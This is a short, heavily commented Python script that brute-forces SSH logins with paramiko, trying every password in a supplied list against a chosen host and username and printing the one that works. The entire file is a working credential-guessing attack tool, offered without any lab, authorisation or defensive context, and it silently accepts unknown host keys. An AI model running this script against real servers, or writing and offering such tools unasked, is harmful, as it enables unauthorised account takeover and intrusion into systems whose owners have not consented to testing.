# A simple script to bruteforce SSH login using a password list
# Usage: python3 ssh_bruteforce.py <target> <username> <password_list>

import paramiko
import sys

def ssh_bruteforce(target, username, password_list):
    print(f"Bruteforcing SSH login for {username}@{target}...") # Inform the user that the bruteforcing process has started
    with open(password_list, "r") as file: # Open the password list file
        for password in file: # Iterate through each line in the file
            password = password.strip() # Remove the newline character at the end of the line
            ssh = paramiko.SSHClient() # Create an SSHClient object
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Automatically add the target to the list of known hosts
            try: # Try to connect to the target using the username and password
                ssh.connect(target, username=username, password=password) # Connect to the target using the username and password
                print(f"Login successful: {username}@{target}:{password}") # Inform the user that the login was successful
                ssh.close() # Close the SSH connection
                break 
            except paramiko.AuthenticationException: # Handle the exception if the authentication fails
                print(f"Login failed: {username}@{target}:{password}")
                ssh.close()

if __name__ == "__main__":
    #argv[0] is the script name, argv[1] is the target IP address, argv[2] is the username, and argv[3] is the password list file
    target = sys.argv[1] # Get the target IP address from the command line arguments
    username = sys.argv[2] # Get the username from the command line arguments
    password_list = sys.argv[3] # Get the password list file from the command line arguments
    ssh_bruteforce(target, username, password_list) # Call the ssh_bruteforce function with the target, username, and password list file